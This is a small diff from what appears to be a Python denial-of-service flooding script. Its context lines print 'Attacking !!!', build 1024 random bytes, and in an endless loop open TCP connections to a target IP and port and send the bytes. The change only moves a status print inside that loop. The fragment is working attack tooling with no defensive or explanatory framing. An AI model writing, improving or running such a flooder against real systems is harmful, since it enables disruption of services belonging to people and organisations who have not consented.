@@ -22,9 +22,9 @@ print ("Attacking !!! Thread:",thread_num)
 
 def run():
 	bytes = random._urandom(1024)
-	print("[!]Try to build a new thread")
 	while True:
 		try:
+			print("[!]Try to build a new thread")
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
